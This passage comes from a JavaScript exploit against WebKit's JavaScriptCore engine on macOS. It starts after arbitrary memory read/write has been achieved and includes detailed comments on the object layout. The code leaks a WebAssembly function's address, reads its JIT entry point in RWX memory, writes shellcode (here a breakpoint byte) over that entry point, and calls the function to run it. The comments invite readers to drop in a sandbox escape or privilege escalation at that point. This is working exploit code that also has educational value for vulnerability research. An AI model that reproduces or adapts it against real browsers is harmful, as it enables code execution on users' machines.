        write16: function(what, addr)  { this.write(16, addr, what); },

        read32:  function(addr)        { return this.read(32, addr); },
        write32: function(what, addr)  { this.write(32, addr, what); },

        read64:  function(addr)        { return this.read(64, addr); },
        write64: function(what, addr)  { this.write(64, addr, what); }
    };

    print("[+] Got stable Memory R/W");

    //
    // Upgraded exploit primitives finally allow arbitrary memory read/write.
    // We're going to use them in order to leak the address of a RWX memory
    // region, and later patch it with shellcode.
    //
    // To do so, I wrote another WebAssembly module which exports a function
    // to the runtime; this particular function does nothing else than invoking
    // another function, which instead is imported from the runtime.
    //
    // As WebAssembly functions are compiled, they're placed inside a RWX
    // memory region.
    //
    // So the idea is to initialize this WebAssembly module, invoke the exported
    // function, redirect it to a local JSFunction... and from there, leak the
    // address of the exported function entry point, which again is located in
    // a RWX memory region.
    //

    var shellcodeFunc;
    var rwxMemAddr;

    var remoteCodeExecutionWasmModule = loadWebAssemblyModule(webAssemblyModules.remoteCodeExecution);

    //
    // This object is going to be imported from 'remoteCodeExecutionWasmModule'.
    // 'leakExecutablePage' is the JSFunction which will be in charge of disclosing
    // an entry point to the RWX memory.
    //
    var remoteCodeExecutionImportObject = {
        imports: {
            leakExecutablePage: function() {
                //
                // 'shellcodeFunc' is now a WebAssemblyFunction:
                //
                //  +0 < 72> WebAssemblyFunction
                //  +0 < 48>     JSC::WebAssemblyFunctionBase JSC::WebAssemblyFunctionBase
                //  +0 < 40>         JSC::JSFunction JSC::JSFunction
                //  +0 < 24>             JSC::JSCallee JSC::JSCallee
                //  +0 < 16>                 JSC::JSNonFinalObject JSC::JSNonFinalObject
                //  +0 < 16>                     JSC::JSObject JSC::JSObject
                //  +0 <  8>                         JSC::JSCell JSC::JSCell
                //  +0 <  1>                             JSC::HeapCell JSC::HeapCell
                //  +0 <  4>                           JSC::StructureID m_structureID
                //  +4 <  1>                           JSC::IndexingType m_indexingTypeAndMisc
                //  +5 <  1>                           JSC::JSType m_type
                //  +6 <  1>                           JSC::TypeInfo::InlineTypeFlags m_flags
                //  +7 <  1>                           JSC::CellState m_cellState
                //  +8 <  8>                         JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly
                //  +8 <  8>                           JSC::Butterfly * m_value
                // +16 <  8>                 JSC::WriteBarrier<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> > m_scope
                // +16 <  8>                     JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> > JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >
                // +16 <  8>                       JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >::StorageType m_cell
                // +24 <  8>             JSC::JSFunction::PoisonedBarrier<JSC::ExecutableBase> m_executable
                // +24 <  8>                 JSC::WriteBarrierBase<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> > JSC::WriteBarrierBase<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> >
                // +24 <  8>                     JSC::WriteBarrierBase<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> >::StorageType m_cell
                // +24 <  8>                       WTF::PoisonedBits m_poisonedBits
                // +32 <  8>             JSC::JSFunction::PoisonedBarrier<JSC::FunctionRareData> m_rareData
                // +32 <  8>                 JSC::WriteBarrierBase<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> > JSC::WriteBarrierBase<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> >
                // +32 <  8>                     JSC::WriteBarrierBase<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> >::StorageType m_cell
                // +32 <  8>                       WTF::PoisonedBits m_poisonedBits
                // +40 <  8>         JSC::PoisonedWriteBarrier<JSC::WebAssemblyFunctionBasePoison, JSC::JSWebAssemblyInstance> m_instance
                // +40 <  8>             JSC::WriteBarrierBase<JSC::JSWebAssemblyInstance, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSWebAssemblyInstance> > JSC::WriteBarrierBase<JSC::JSWebAssemblyInstance, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSWebAssemblyInstance> >
                // +40 <  8>                 JSC::WriteBarrierBase<JSC::JSWebAssemblyInstance, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSWebAssemblyInstance> >::StorageType m_cell
                // +40 <  8>                   WTF::PoisonedBits m_poisonedBits
                // +48 <  8>     JSC::MacroAssemblerCodePtr<64376> m_jsEntrypoint
                // +48 <  1>         JSC::MacroAssemblerCodePtrBase JSC::MacroAssemblerCodePtrBase
                // +48 <  8>         JSC::PoisonedMasmPtr m_value
                // +48 <  8>           WTF::PoisonedBits m_poisonedBits
                // +56 < 16>     JSC::Wasm::WasmToWasmImportableFunction m_importableFunction
                // +56 <  8>       JSC::Wasm::SignatureIndex signatureIndex
                // +64 <  8>       JSC::Wasm::WasmToWasmImportableFunction::LoadLocation entrypointLoadLocation
                //

                var wasmFunctionAddr = primitives.addrof(shellcodeFunc);
                print("[+] Wasm function @ " + wasmFunctionAddr);

                //
                // The field 'm_jsEntrypoint' (offset 48) points to the entry point
                // of the JIT compiled function.
                //
                // lldb output (with 'm_jsEntrypoint' pointing at 0x00002b16ae0058e0):
                //
                // (lldb) memory region 0x00002b16ae0058e0
                // [0x00002b16ae001000-0x00002b16ee001000) rwx
                //
                // (lldb) dis -s 0x00002b16ae0058e0
                //     0x2b16ae0058e0: pushq  %rbp
                //     0x2b16ae0058e1: movq   %rsp, %rbp
                //     0x2b16ae0058e4: movq   $0x0, 0x10(%rbp)
                //     0x2b16ae0058ec: movabsq $0x109128063, %r10        ; imm = 0x109128063
                //     0x2b16ae0058f6: movq   %r10, 0x18(%rbp)
                //     0x2b16ae0058fa: subq   $0x30, %rsp
                //

                rwxMemAddr = primitives.read64(Add(wasmFunctionAddr, 48));
                print("[+] RWX memory @ " + rwxMemAddr);
            }
        }
    };

    var remoteCodeExecutionWasmInstance = new WebAssembly.Instance(remoteCodeExecutionWasmModule, remoteCodeExecutionImportObject);

    //
    // We first store a reference to the exported WebAssembly function,
    // and then invoke it: in this way, the 'leakExecutablePage' has
    // access to the reference itself.
    //
    var leakExecutablePageAddress = remoteCodeExecutionWasmInstance.exports.triggerLeak;
    shellcodeFunc = leakExecutablePageAddress;

    //
    // This call will invoke the exported function 'triggerLeak', which,
    // in turn, will invoke the local 'leakExecutablePage' routine.
    //
    leakExecutablePageAddress();

    //
    // Ensure we're running on macOS by analysing the prologue
    // of the JIT function.
    //
    if (!isMacOS(primitives.read64(rwxMemAddr).bytes))
        throw "iOS is not supported (yet?)";

    //
    // Only thing left to do, is to replace the current RWX memory region with shellcode,
    // and then invoke 'shellcodeFunc'.
    //
    // I'm just going to trigger an interrupt; if you have something cool to run (like
    // a sanbox-escape, an LPE etc), well... you're supposed to run it here.
    //
    primitives.write8(0xcc, rwxMemAddr);

    print("[+] Shellcode patched");

    print("[!] Jumping into shellcode...");

    var res = shellcodeFunc();

    if (res === 0)
        print("[+] Shellcode executed sucessfully!");
    else
        print("[-] Shellcode failed to execute: error " + res);
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});